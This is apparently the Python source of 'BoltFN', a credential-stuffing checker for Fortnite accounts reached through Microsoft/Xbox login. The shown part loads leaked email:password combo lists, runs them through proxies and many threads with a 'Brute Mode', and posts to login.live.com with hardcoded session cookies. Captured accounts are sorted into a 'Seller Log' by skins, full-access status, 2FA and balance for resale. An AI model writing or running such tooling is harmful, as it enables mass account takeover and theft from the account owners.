# -*- coding: utf-8 -*-
import re
import colorama
import concurrent.futures
import threading
from PIL import Image, ImageDraw, ImageFont, UnidentifiedImageError
import aiohttp
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import requests
from itertools import groupby
from operator import itemgetter
from PIL import Image, ImageDraw, ImageFont
from functools import lru_cache
import pickle
import io
import asyncio
import re
import io
import math
from yaml import dump, full_load
import imaplib
from tkinter import filedialog
from urllib3 import disable_warnings
import requests
from colorama import init, Fore
from random import choice, shuffle
import cloudscraper
import win32api
import time
import sys
import time
import os
import traceback
import urllib.request
from ctypes import windll
from os import mkdir, path, system
from queue import Queue
from random import choice
from re import compile as compilee
from threading import Thread
from time import sleep, strftime, gmtime
import urllib3
import urllib
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



init()
default_values = '''checker:
  print_fail: false
  print_ms_hit: false
  retries: 1
  timeout: 6000
  threads: 25
  save_bad: false
  display_mode: bolt
  import_from_file: false
  webhook:
    Webhook: false
    WebhookID: https://discordapp.com/api/webhooks/
  proxy:
    proxy: false
    proxy_type: HTTP
    proxy_api: false
    api_link: 
'''

while True:
    try:
        config = full_load(open('config/config.yml', 'r', errors='ignore'))
        break
    except FileNotFoundError:
        print(f'{Fore.CYAN}Configuration: Creating Config{Fore.RESET}')
        if not path.exists('config'):
            mkdir('config')
        if not path.exists('combos'):
            mkdir('combos')
        if not path.exists('proxies'):
            mkdir('proxies')
        open('config/config.yml', 'w').write(default_values)
        print(f'{Fore.CYAN}Configuration: {Fore.GREEN}Created')
        sleep(1.5)
        system('cls')


class banchecker:
    unbanned = 0
    nfa = 0
    sfa = 0
    tempbanned = 0
    banned = 0
    checked = 0
    bad = 0



class Counter:
    sellerstuff = []
    proxy = False
    brute = False
    Checking = False
    remaining = []
    og = 0
    stw = 0
    headless = 0
    skins_data = []
    xb = 0
    custom = 0
    epic2fa = 0
    fnban = 0
    locked = 0
    mshit = 0
    badd = 0
    hits = 0
    bad = 0
    cpm = 0
    retries = 0
    invalid = 0
    total = 0
    hitspercent = 0
    custompercent = 0
    mshitspercent = 0
    headlesspercent = 0
    failedpercent = 0
    checkedpercent = 0
    guess = 0
    goodlines = 0
    badlines = 0


class Main:
    CACHE_DIR = './caches'
    def __init__(self):
        if not os.path.exists(self.CACHE_DIR):
            os.makedirs(self.CACHE_DIR)
        from time import time
        self.bar = ''
        self.cache = {}
        self.unix = str(strftime('-[%d-%m-%Y %H-%M-%S]'))
        self.email = r'[\w.-]+@[\w.-]+'
        self.extracted = '\nSaved extracted'
        self.created = str(strftime('-[%m-%d-%Y %H-%M-%S]'))
        self.domain_list = self.lisr()
        disable_warnings()
        self.version = '999.999'
        self.printing = Queue()
        self.caputer = Queue()
        self.start_time = 0
        self.hits = Queue()
        self.bad = Queue()
        self.baddd = []
        self.savebad = Checker.save_bad
        self.proxyapi = Checker.Proxy.proxy_api
        self.api_link = Checker.Proxy.proxy_api_link
        self.Paused = False
        self.proxy_type = Checker.Proxy.type
        windll.kernel32.SetConsoleTitleW(
            f'BoltFN | Main menu')
        from colorama import Fore
        self.t = f'''{Fore.LIGHTWHITE_EX}  

                {Fore.GREEN}██████{Fore.CYAN}╗{Fore.GREEN}  ██████{Fore.CYAN}╗{Fore.GREEN} ██{Fore.CYAN}╗{Fore.GREEN}  ████████{Fore.CYAN}╗{Fore.GREEN} ██████{Fore.CYAN}╗{Fore.GREEN}██{Fore.CYAN}╗{Fore.GREEN}  ██{Fore.CYAN}╗{Fore.GREEN}███████{Fore.CYAN}╗{Fore.GREEN} ██████{Fore.CYAN}╗{Fore.GREEN}██{Fore.CYAN}╗{Fore.GREEN}  ██{Fore.CYAN}╗{Fore.GREEN}███████{Fore.CYAN}╗{Fore.GREEN}██████{Fore.CYAN}╗ 
                {Fore.GREEN}██{Fore.CYAN}╔══{Fore.GREEN}██{Fore.CYAN}╗{Fore.GREEN}██{Fore.CYAN}╔═══{Fore.GREEN}██{Fore.CYAN}╗{Fore.GREEN}██{Fore.CYAN}║  ╚══{Fore.GREEN}██{Fore.CYAN}╔══╝{Fore.GREEN}██{Fore.CYAN}╔════╝{Fore.GREEN}██{Fore.CYAN}║{Fore.GREEN}  ██{Fore.CYAN}║{Fore.GREEN}██{Fore.CYAN}╔════╝{Fore.GREEN}██{Fore.CYAN}╔════╝{Fore.GREEN}██{Fore.CYAN}║{Fore.GREEN} ██{Fore.CYAN}╔╝{Fore.GREEN}██{Fore.CYAN}╔════╝{Fore.GREEN}██{Fore.CYAN}╔══{Fore.GREEN}██{Fore.CYAN}╗
                {Fore.GREEN}██████{Fore.CYAN}╔╝{Fore.GREEN}██{Fore.CYAN}║{Fore.GREEN}   ██{Fore.CYAN}║{Fore.GREEN}██{Fore.CYAN}║{Fore.GREEN}     ██{Fore.CYAN}║{Fore.GREEN}   ██{Fore.CYAN}║{Fore.GREEN}     ███████{Fore.CYAN}║{Fore.GREEN}█████{Fore.CYAN}╗{Fore.GREEN}  ██{Fore.CYAN}║{Fore.GREEN}     █████{Fore.CYAN}╔╝{Fore.GREEN} █████{Fore.CYAN}╗{Fore.GREEN}  ██████{Fore.CYAN}╔╝
                {Fore.CYAN}██{Fore.GREEN}╔══{Fore.CYAN}██{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}   ██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}     ██{Fore.GREEN}║{Fore.CYAN}   ██{Fore.GREEN}║{Fore.CYAN}     ██{Fore.GREEN}╔══{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}╔══╝{Fore.CYAN}  ██{Fore.GREEN}║{Fore.CYAN}     ██{Fore.GREEN}╔═{Fore.CYAN}██{Fore.GREEN}╗{Fore.CYAN} ██{Fore.GREEN}╔══╝{Fore.CYAN}  ██{Fore.GREEN}╔══{Fore.CYAN}██{Fore.GREEN}╗
                {Fore.CYAN}██████{Fore.GREEN}╔╝╚{Fore.CYAN}██████{Fore.GREEN}╔╝{Fore.CYAN}███████{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}║   ╚{Fore.CYAN}██████{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}  ██{Fore.GREEN}║{Fore.CYAN}███████{Fore.GREEN}╗╚{Fore.CYAN}██████{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}  ██{Fore.GREEN}╗{Fore.CYAN}███████{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}  ██{Fore.GREEN}║
                {Fore.GREEN}╚═════╝  ╚═════╝ ╚══════╝╚═╝    ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
'''


        
        def versionchecker():
            import os
            import re
            import shutil
            import sqlite3
            from sys import exit
            from json import loads
            from random import randint
            from shutil import copyfile
            from base64 import b64decode

        versionchecker()
        def print_slowly(text, speed):
            for c in text:
                print(c, end='')
                sys.stdout.flush()
                sleep(speed)
            sleep(0.1)
        print(Fore.CYAN)
        print_slowly('Checking for updates .....', 0)
        from time import time
        system('cls')
        windll.kernel32.SetConsoleTitleW(
                f'BoltFN | v{self.version} | Select a mode')
        print(self.t)
        print(f'''
                                {Fore.WHITE}[{Fore.GREEN}1{Fore.WHITE}] Fortnite via Xbox {Fore.WHITE}[{Fore.CYAN}Full Capture using Microsoft authentication{Fore.WHITE}]
                                {Fore.WHITE}[{Fore.GREEN}2{Fore.WHITE}] Fortnite via Xbox {Fore.WHITE}[{Fore.CYAN}Brute Mode{Fore.WHITE}]
                                {Fore.WHITE}[{Fore.GREEN}3{Fore.WHITE}] Proxy Checker     {Fore.WHITE}[{Fore.CYAN}Check if your proxies work for Microsoft{Fore.WHITE}]
                                {Fore.WHITE}[{Fore.GREEN}4{Fore.WHITE}] Exit
''')
        mode = input(f'{Fore.YELLOW}                > ')



        if mode == "3":
            system('cls')
            print(self.t)
            print("")
            Counter.proxy = True
        elif mode == "4":
            exit()
        elif mode == "1" or mode == "2":
            if mode == "2":
                Counter.brute = True
            system('cls')
            print(self.t)
            print("")
        else:
            print("Wrong number!")
            system('cls')
            Main()
        if not Counter.proxy:
            checkname = "idkkklolll"
            while True:
                try:
                    if Checker.mode.lower() in ('bolt', 'cn', 'nexus'):
                        self.cuimode = 'y'
                        break
                    elif 'log' == Checker.mode.lower():
                        self.cuimode = 'n'
                        print(Fore.YELLOW)
                        print_slowly('Using Log Mode', 0)
                        break
                    else:
                        Checker.mode = input(f'{Fore.LIGHTCYAN_EX}Display mode? cui/log: ')
                except:
                    print(f'{Fore.RED}Invalid input')
            if self.cuimode == 'y':
                while True:
                    try:
                        if Checker.mode.lower() == 'cn':
                            self.cuitype = 'cn'
                            print(Fore.GREEN)
                            print_slowly('Using CnChecker CUI', 0)
                            break
                        elif Checker.mode.lower() == 'nexus':
                            self.cuitype = 'nexus'
                            print(Fore.RED)
                            print_slowly('Using Nexus CUI', 0)
                            break
                        else:
                            Checker.mode = input(f'{Fore.LIGHTCYAN_EX}CUI mode? bolt/cn/nexus: ')
                    except:
                        print(f'{Fore.RED}Invalid input')

            system('cls')
            print(self.t)
            print("")
            print(f'{Fore.LIGHTCYAN_EX}Here is your current config:\n')
            print(f'{Fore.CYAN}-- Proxy: {Checker.Proxy.proxy}')
            if Checker.Proxy.proxy == True:
                print(f'{Fore.CYAN}-- Proxy Type: {Checker.Proxy.type}')
            print(f'{Fore.CYAN}-- Threads: {Checker.threads}')
            print(f'{Fore.CYAN}-- Timeout: {Checker.timeout}')
            print(
                f'{Fore.LIGHTCYAN_EX}Are you happy with this config? (y to start checking n to edit)')
            edit = 'y'
            if 'n' in edit:
                system('cls')
                print(self.t)
                print(f'{Fore.CYAN}Configuration: Ok lets edit your config then\n')
                print(
                    f'{Fore.CYAN}Configuration: Would you like to use proxies for checking? y/n')
                lol = input('> ')
                if 'y' == lol:
                    Checker.Proxy.proxy = True
                else:
                    Checker.Proxy.proxy = False
                print(f'{Fore.CYAN}Configuration: Proxy set to {Checker.Proxy.proxy}')
                if Checker.Proxy.proxy:
                    print(
                        f'{Fore.CYAN}Configuration: What type of proxy are you using? socks4|socks5|http')
                    self.proxy_type = str(input('> '))
                    print(
                        f'{Fore.CYAN}Configuration: Proxy Type set to {self.proxy_type}')
                print(
                    f'{Fore.CYAN}Configuration: How many threads would you like to use? (max 1000)')
                while True:
                    try:
                        Checker.threads = int(input('> '))
                        break
                    except:
                        print(f'{Fore.CYAN}Configuration: Please Enter a number')
                        sleep(0.5)
                print(f'{Fore.CYAN}Configuration: Threads set to {Checker.threads}')
                print(
                    f'{Fore.CYAN}Configuration: What would you like your request timeout to be? (in seconds)')
                Checker.timeout = int(input('> '))
                print(
                    f'{Fore.CYAN}Configuration: Request timeout set to {Checker.timeout}')
                print(f'{Fore.CYAN}Configuration: How many retries would you like?')
                Checker.retries = int(input('> '))
                print(f'{Fore.CYAN}Configuration: Retries set to {Checker.retries}')
                config['checker']['proxy']['proxy'] = Checker.Proxy.proxy
                config['checker']['threads'] = Checker.threads
                config['checker']['timeout'] = Checker.timeout * 1000 
                config['checker']['retries'] = Checker.retries
                config['checker']['proxy']['proxy_type'] = self.proxy_type
                with open('config/config.yml', 'w') as file:
                    dump(config, file)
                print(f'{Fore.GREEN}Configuration: Updated values')
                sleep(1)
                system('cls')
                
            print(f'{Fore.CYAN}Importing combos.....\n')
            self.combolist = []
            archive_dir = 'archivedcombo'

            if not os.path.exists(archive_dir):
                os.makedirs(archive_dir)

            def unique_file_path(directory, filename):
                """Generate a unique file path by appending a number if the file already exists."""
                base, ext = os.path.splitext(filename)
                counter = 1
                new_filename = filename
                while os.path.exists(os.path.join(directory, new_filename)):
                    new_filename = f"{base}_{counter}{ext}"
                    counter += 1
                return os.path.join(directory, new_filename)

            while True:
                if not Checker.importFromFile:
                    read_files = glob('combos/*.txt')
                    if not read_files:
                        print(f'{Fore.YELLOW}No Combo files found in directory. Please put your combos in there and try again.')
                        input(f'{Fore.CYAN}Press ENTER when you have done that')
                        continue
                    for file in read_files:
                        with open(file, 'r', encoding='u8', errors='ignore') as f:
                            combolistt = f.read().split('\n')
                            for line in combolistt:
                                self.combolist.append(f'{line}')
                        # Ensure unique file name when moving to archive
                        unique_path = unique_file_path(archive_dir, os.path.basename(file))
                        os.rename(file, unique_path)
                    break
                else:
                    filename = filedialog.askopenfile(mode='rb', title='Choose a Combo file', filetype=(("txt", "*.txt"), ("All files", "*.txt")))
                    if filename is None:
                        print(Fore.LIGHTRED_EX + "Invalid File.")
                        sleep(1)
                        continue
                    else:
                        try:
                            with open(filename.name, 'r', encoding='u8') as e:
                                for line in e:
                                    self.combolist.append(f'{line}')
                            # Ensure unique file name when moving to archive
                            unique_path = unique_file_path(archive_dir, os.path.basename(filename.name))
                            os.rename(filename.name, unique_path)
                            break
                        except Exception as e:
                            print(Fore.LIGHTRED_EX + "Unable to read from file")
                            sleep(1)
                            continue

            withoutremoved = len(self.combolist)
            self.accounts = set([x for x in self.combolist if x != '' and ':' in x])
            removed = withoutremoved - len(self.accounts)
            print(f'{Fore.GREEN}Imported {len(self.accounts)} Combo lines after removing {removed} duplicates\n')


        self.proxylist = []
        if Checker.Proxy.proxy or Counter.proxy:
            print(f'{Fore.CYAN}Importing proxies.....\n')
            while True:
                if not self.proxyapi:
                    if not Checker.importFromFile:
                        read_files = glob('proxies/*.txt')
                        if read_files == '[]':
                            print(
                                f'{Fore.YELLOW}No Proxies files found in directory please put your proxies in there and try again')
                            input(f'{Fore.CYAN}Press ENTER when you have done that')
                            continue
                        for file in read_files:
                            proxylistt = open(file, 'r', encoding='u8',
                                            errors='ignore').read().split('\n')
                            for line in proxylistt:
                                self.proxylist.append(f'{line}')
                        break
                    else:
                        filename = filedialog.askopenfile(mode='rb', title='Choose a Proxy file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
                        if filename is None:
                            print(Fore.LIGHTRED_EX+"Invalid File.")
                            sleep(1)
                            continue
                        else:
                            try:
                                with open(filename.name, 'r', encoding='u8') as e:
                                    for line in e:
                                        self.proxylist.append(f'{line}')
                                    break
                            except:
                                print(Fore.LIGHTRED_EX+"Unable to read from file")
                                sleep(1)
                                continue
        if Checker.Proxy.proxy or Counter.proxy:
            if not self.proxyapi:
                withoutremoved = len(self.proxylist)
                self.proxylist = list(
                    set([x.strip() for x in self.proxylist if ":" in x and x != '']))
                removed = withoutremoved - len(self.proxylist)
                print(f'{Fore.GREEN}Imported {len(self.proxylist)} Proxy lines after removing {removed} duplicates')
            else:
                if not Counter.proxy:
                    print(f'{Fore.CYAN}Importing proxies from api...\n')
                    self.proxylist = requests.get(
                        Checker.Proxy.proxy_api_link).text.split('\n')
                    print(f'{Fore.GREEN}Imported {len(self.proxylist)} Proxy lines\n')
        print(f'{Fore.LIGHTCYAN_EX}[BoltFN] Starting Threads...\n')
        windll.kernel32.SetConsoleTitleW(
            f'BoltFN | v{self.version} | Getting ready!')
        unix = str(strftime('%d-%m-%Y %H-%M-%S'))
        if not path.exists('Results'):
            mkdir('Results')
        if Counter.proxy:
            self.folder = f'Results/Proxy Checker-{unix}'
        elif Counter.brute:
            self.folder = f'Results/Brute Mode-({checkname}){unix}'
        else:
            self.folder = f'Results/Normal Mode-({checkname}){unix}'
        if not path.exists(self.folder):
            mkdir(self.folder)
        if Counter.proxy:
            Thread(target=self.proxy_cpm, daemon=False).start()
        else:
            Thread(target=self.cpm_counter, daemon=False).start()
        Thread(target=self.title, daemon=False).start()
        self.start_time = time()
        print(f'{Fore.GREEN}[BoltFN] Done!\n')
        sleep(3)
        system('cls')
        print(self.t)
        if not Counter.proxy:
            if 'y' == self.cuimode:
                print(f'{Fore.LIGHTCYAN_EX}Checking: CUI Mode')
            else:
                print(f'{Fore.LIGHTCYAN_EX}Checking: LOG Mode')
            print(f'{Fore.CYAN}-- Proxy: {Checker.Proxy.proxy}')
            if Checker.Proxy.proxy:
                print(f'{Fore.CYAN}-- Proxy Type: {Checker.Proxy.type}')
            print(f'{Fore.CYAN}-- Threads: {Checker.threads}')
            print(f'{Fore.CYAN}-- Timeout: {Checker.timeout}')
            print(f'{Fore.CYAN}-- Retries: {Checker.retries}\n')
            try:
                print(f'{Fore.CYAN}- Combo Lines: {len(self.combolist)}')
                print(f'{Fore.CYAN}- Proxy Lines: {len(self.proxylist)}\n')
            except:
                self.proxylist = []
                print('\n')
        else:
            print(f'{Fore.LIGHTCYAN_EX}Checking: Proxy Checker\n')
            print(f'{Fore.CYAN}- Proxy Lines: {len(self.proxylist)}\n')
        if not Counter.proxy:
            Counter.Checking = True
        if not Counter.proxy:
            if 'y' == self.cuimode:
                Thread(target=self.Refreshconsole, daemon=False).start()
            Counter.remaining = list(self.accounts)
            with concurrent.futures.ThreadPoolExecutor(max_workers=Checker.threads) as executor:
                futures = [executor.submit(self.usecheck, combo) for combo in self.accounts]
                concurrent.futures.wait(futures)
        else:
            with concurrent.futures.ThreadPoolExecutor(max_workers=Checker.threads) as executor:
                futures = [executor.submit(self.proxycheck, proxy) for proxy in self.proxylist]
                concurrent.futures.wait(futures)
        Counter.Checking = False
        if not Counter.proxy:
            categorized_data = {
                "Exclusives": [],
                "300+ Skins": [],
                "200-299 Skins": [],
                "100-199 Skins": [],
                "50-99 Skins": [],
                "10-49 Skins": [],
                "1-9 Skins": [],
                "0 Skins": []
            }

            for entry in Counter.sellerstuff:
                if entry['exclusive']:
                    categorized_data["Exclusives"].append(entry)
                elif entry["total_skins"] >= 300:
                    categorized_data["300+ Skins"].append(entry)
                elif 200 <= entry["total_skins"] <= 299:
                    categorized_data["200-299 Skins"].append(entry)
                elif 100 <= entry["total_skins"] <= 199:
                    categorized_data["100-199 Skins"].append(entry)
                elif 50 <= entry["total_skins"] <= 99:
                    categorized_data["50-99 Skins"].append(entry)
                elif 10 <= entry["total_skins"] <= 49:
                    categorized_data["10-49 Skins"].append(entry)
                elif 1 <= entry["total_skins"] <= 9:
                    categorized_data["1-9 Skins"].append(entry)
                else:
                    categorized_data["0 Skins"].append(entry)

            with open(f'{self.folder}/Seller Log.txt', 'w', encoding='utf-8') as file:
                for category, entries in categorized_data.items():
                    if entries:
                        file.write(f"========== {category} ==========\n")
                        for entry in entries:
                            if entry['fullAccess'] == 'FA':
                                fa = 'True'
                            else:
                                fa = 'False'
                            file.write(f"FullAccess: {fa} | VerifiedEmail: {entry['mail_verified']} | TwoFactor: {entry['2fa']} | LinkedAccounts: {entry['linked_accs']} | Balance: {entry['balance']} | LastMatch: {entry['last_login']}\n")
                            if category != '0 Skins':
                                file.write(f"Skins: [{entry['total_skins']}] {', '.join(entry['skins_list'])}\n")
                            if entry['exclusive']:
                                file.write(f"Exclusives: [{len(entry['exclusives_list'])}] {', '.join(entry['exclusives_list'])}\n")
                            if entry['gamesowned']:
                                file.write(f"Owned Games: [{len(entry['gamesowned'])}] \nList Games: [{', '.join(entry['gamesowned'])}] \n")
                            file.write("=" * 30 + "\n")

            sleep(5)
            system('cls')
            print(self.t)
            print(f'{Fore.CYAN}Done checking\n')
            print(f'{Fore.GREEN}Seller Log created, you may close the checker')
        else:
            print(f'{Fore.CYAN}Done checking\n')
                    
    def proxycheck(self,proxy):
        proxy = choice(self.proxylist)
        if self.proxy_type.lower() == 'http' or self.proxy_type.lower() == 'https':
            proxy_form = {'http': 'http://'+proxy, 'https': 'http://'+proxy}
        else:
            proxy_form = {
                'http': f"{self.proxy_type.lower()}://{proxy}",
                'https': f"{self.proxy_type.lower()}://{proxy}"
            }
        headers = {
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en,en-US;q=0.9,en;q=0.8",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Content-Length": "814",
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": "MicrosoftApplicationsTelemetryDeviceId=920e613f-effa-4c29-8f33-9b639c3b321b; MSFPC=GUID=1760ade1dcf744b88cec3dccf0c07f0d&HASH=1760&LV=202311&V=4&LU=1701108908489; mkt=ar-SA; IgnoreCAW=1; MUID=251A1E31369E6D281AED0DE737986C36; MSCC=197.33.70.230-EG; MSPBack=0; NAP=V=1.9&E=1cca&C=sD-vxVi5jYeyeMkwVA7dKII2IAq8pRAa4DmVKHoqD1M-tyafuCSd4w&W=2; ANON=A=D086BC080C843D7172138ECBFFFFFFFF&E=1d24&W=2; SDIDC=CVbyEkUg8GuRPdWN!EPGwsoa25DdTij5DNeTOr4FqnHvLfbt1MrJg5xnnJzsh!HecLu5ZypjM!sZ5TtKN5sdEd2rZ9rugezwzlcUIDU5Szgq7yMLIVdfna8dg3sFCj!kQaXy2pwx6TFwJ7ar63EdVIz*Z3I3yVzEpbDMlVRweAFmG1M54fOyH0tdFaXs5Mk*7WyS05cUa*oiyMjqGmeFcnE7wutZ2INRl6ESPNMi8l98WUFK3*IKKZgUCfuaNm8lWfbBzoWBy9F3hgwe9*QM1yi41O*rE0U0!V4SpmrIPRSGT5yKcYSEDu7TJOO1XXctcPAq21yk*MnNVrYYfibqZvnzRMvTwoNBPBKzrM6*EKQd6RKQyJrKVdEAnErMFjh*JKgS35YauzHTacSRH6ocroAYtB0eXehx5rdp2UyG5kTnd8UqA00JYvp4r1lKkX4Tv9yUb3tZ5vR7JTQLhoQpSblC4zSaT9R5AgxKW3coeXxqkz0Lbpz!7l9qEjO*SdOm*5LBfF2NZSLeXlhol**kM3DFdLVyFogVq0gl0wR52Y02; MSPPre=imrozza%40outlook.com%7c8297dd0d702a14b0%7c%7c; MSPCID=8297dd0d702a14b0; MSPSoftVis=@:@; MSPRequ=id=N&lt=1701944501&co=0; uaid=a7afddfca5ea44a8a2ee1bba76040b3c; OParams=11O.DmVQflQtPeQAtoyExD*hjGXsJOLcnQHVlRoIaEDQfzrgMX2Lpzfa992qCQeIn0O8kdrgRfMm1kEmcXgJqSTERtHj0vlp9lkdMHHCEwZiLEOtxzmks55h!6RupAnHQKeVfVEKbzcTLMei4RMeW1drXQ0BepPQN*WgCK3ua!f6htixcJYNtwumc8f29KYtizlqh0lqQ3a2dZ4Kd!KDOneLTE512ScqObfQd5AGBu*xLbcRbg6xqh1eWCOXW!JOT6defiMqxBGPNL1kQUYgc5WAG8tmjMPFLqVn1*f4xws1NDhwmYOHPu!rS9dn*trC71knxMAfi5Tt69XZHdojgnuopBag*YM7uIBrhUyfxjR*4Zkyygfax9gMaxxG9KScOnPvemNY1ZfVH9Vm!IxQFKoPoKBdLVH5Jc7Eokycow31oq7vNcAbi!cS3Wby0LjzBdr8jq2Aqj3RlWfckJaRoReZ4nY34Gh*eVllAMrF*VQP1iQ7t*I28266q6OQGZ9Y1q53Ai72b!8H5wjQJIJw1XV4zwRO8J02gt6vIPpLBFiq!7IkawEubBPpynkQ3neDo92Tpc71Y*WrnD6H8ojgzxRAj!DIiyfyA7kJHJ7DU!XSg*Xo0L1!DRYSBV!PKwNM7MaBiqsKbRWFnFyzKhBACfiPe8dK5ZUGBSpFbUlpXkUJOb247ewTWAsl9D4G6mezVjGY1u9uOYUPc3ZqTEBFRf4TK94CllbiMRC0v26W*qlwOl0SSpBufo8MtOUqvowUFqEWDDVl9WFV5bT2zZVUy4kPj9a*3YNnskgZghnOCtQYKIIRdFTWgL*DcbQ4XRL8hMisBDjyniS16W2P!1FH0dT12w7RlsJCdotQSK1WppX8sGWNrPrYNcih5ErXVZtYKbqrZLw2EcyGmkp7NxBHFUQXx*1tZSEeiWoZ5BrHSiEB7X2gB7BQDP7RbVYZS5UXeNp3rlGdN*5!nUGK3Fltm1sKFmtZU!T1Q0WaeFwVvpFYSCxg9uw6CC!va2dB*R6NFK!3GNBDrCvbXnJMaKVb!UoBP5G*GASdPnuJgb3cjUE*DIYMJRrPT!dZoHd5BAQSF3vBoPZasphWeflxXFMPBi055OBEawIzxOqS6Wn3IZCp3dgk8QLNssATkzwZvpUM5lSq710QTMZWENDKp5gTIlWcdYpKG1d8TmRlqXRJN7bdUuRIoehIWqnfSuJxGoNk6PM3x3!gMaxPxe1Ch6hMmsagHM8fFQ!MpP0TQ9nsIxh1goCaL*PbHDyj1U3btyu2RXibwIwgV1h5A6DgwmgbaH1Hn9LpdLipiT5fGiRbI903!wYUA3MgQg98OH9BQaJPXte1YpL8iUjUA9MreaZTQ5P13cUiNYrkTW2jVr5PTpEJvwpg*8piWEo9k*IzOCr6iKMRiZwTft*QYEEaKxbyvgLG*s33uhCN46R9J1VwPufzsxyGUHYyE5S1mhx8sWxw!pndIQ!RgVEsDfzvOO0H2P1hBGQG8npJ18th2WKYrvouqHZfRBcEc77hsbXUKec2lv4ETHag0RdrT6kFn03RDX*p*Hac*nugVJK1j0GouxkITbOmMjb8cpau*Lf*xNBUFc3roCuPjEpAcR48X51rIGpOjhAe56Q6CbwIuVe*z*KmRptzngkT4!AB*FGGKh2lOi6b0qR1w4Aia2g1pfjJU2G1r*Q!kSNxYtGn0WOkHiVkhAXQCvkNFp3q!ivZs3obM!0ffg$$; ai_session=6FvJma4ss/5jbM3ZARR4JM|1701943445431|1701944504493; MSPOK=$uuid-d9559e5d-eb3c-4862-aefb-702fdaaf8c62$uuid-d48f3872-ff6f-457e-acde-969d16a38c95$uuid-c227e203-c0b0-411f-9e65-01165bcbc281$uuid-98f882b7-0037-4de4-8f58-c8db795010f1$uuid-0454a175-8868-4a70-9822-8e509836a4ef$uuid-ce4db8a3-c655-4677-a457-c0b7ff81a02f$uuid-160e65e0-7703-4950-9154-67fd0829b36",
            "Host": "login.live.com",
            "Origin": "https://login.live.com",
            "Referer": "https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&state=eyJpZCI6IjAzZDZhYmM1NDIzMjQ2Yjg5MWNhYmM2ODg0ZGNmMGMzIn0%3D&scope=xboxlive.signin&service_entity=undefined&force_verify=true&response_type=code&display=popup",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
            "sec-ch-ua": "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\""
        }
        url = 'https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&contextid=A31E247040285505&opid=F7304AA192830107&bk=1701944501&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216'
        payload = {
            "i13": "0",
            "login": 'proxychecker@proxy.me',
            "loginfmt": 'proxychecker@proxy.me',
            "type": "11",
            "LoginOptions": "3",
            "lrt": "",
            "lrtPartition": "",
            "hisRegion": "",
            "hisScaleUnit": "",
            "passwd": 'test123!T',
            "ps": "2",
            "psRNGCDefaultType": "1",
            "psRNGCEntropy": "",
            "psRNGCSLK": "-DiygW3nqox0vvJ7dW44rE5gtFMCs15qempbazLM7SFt8rqzFPYiz07lngjQhCSJAvR432cnbv6uaSwnrXQ*RzFyhsGXlLUErzLrdZpblzzJQawycvgHoIN2D6CUMD9qwoIgR*vIcvH3ARmKp1m44JQ6VmC6jLndxQadyaLe8Tb!ZLz59Te6lw6PshEEM54ry8FL2VM6aH5HPUv94uacHz!qunRagNYaNJax7vItu5KjQ",
            "canary": "",
            "ctx": "",
            "hpgrequestid": "",
            "PPFT": "-DjzN1eKq4VUaibJxOt7gxnW7oAY0R7jEm4DZ2KO3NyQh!VlvUxESE5N3*8O*fHxztUSA7UxqAc*jZ*hb9kvQ2F!iENLKBr0YC3T7a5RxFF7xUXJ7SyhDPND0W3rT1l7jl3pbUIO5v1LpacgUeHVyIRaVxaGUg*bQJSGeVs10gpBZx3SPwGatPXcPCofS!R7P0Q$$",
            "PPSX": "Passp",
            "NewUser": "1",
            "FoundMSAs": "",
            "fspost": "0",
            "i21": "0",
            "CookieDisclosure": "0",
            "IsFidoSupported": "1",
            "isSignupPost": "0",
            "isRecoveryAttemptPost": "0",
            "i19": "21648"
        }
        while True:
            try:
                response = requests.post(url, headers=headers, data=payload, proxies=proxy_form, timeout=Checker.timeout)
                Counter.hits+=1
                self.prints(f'{Fore.GREEN}[Hit] - {proxy}')
                open(f'{self.folder}/Hits.txt', 'a',encoding='u8').write(f'{proxy}\n')
                return
            except Exception as e:
                Counter.bad+=1
                self.prints(f'{Fore.RED}[Bad] - {proxy}')
                open(f'{self.folder}/Bad.txt', 'a',encoding='u8').write(f'{proxy}\n')
                return
        




    
    Image.MAX_IMAGE_PIXELS = None
    current_dir = os.path.dirname(__file__)
     
    directorio_actual = os.path.dirname(os.path.abspath(__file__))
    FONT_PATH = os.path.join(directorio_actual, "fonts", "Burbank Big Regular Bold.otf") 
        
    rarity_backgrounds = {
        "Common": os.path.join(current_dir, "cuadrados", "commun.png"),
        "Uncommon": os.path.join(current_dir, "cuadrados", "uncommun.png"),
        "Rare": os.path.join(current_dir, "cuadrados", "rare.png"),
        "Epic": os.path.join(current_dir, "cuadrados", "epico.png"),
        "Legendary": os.path.join(current_dir, "cuadrados", "legendary.png"),
        "Mythic": os.path.join(current_dir, "cuadrados", "mitico.png"),
        "Icon Series": os.path.join(current_dir, "cuadrados", "idolo.png"),
        "DARK SERIES": os.path.join(current_dir, "cuadrados", "dark.png"),
        "Star Wars Series": os.path.join(current_dir, "cuadrados", "star wars.png"),
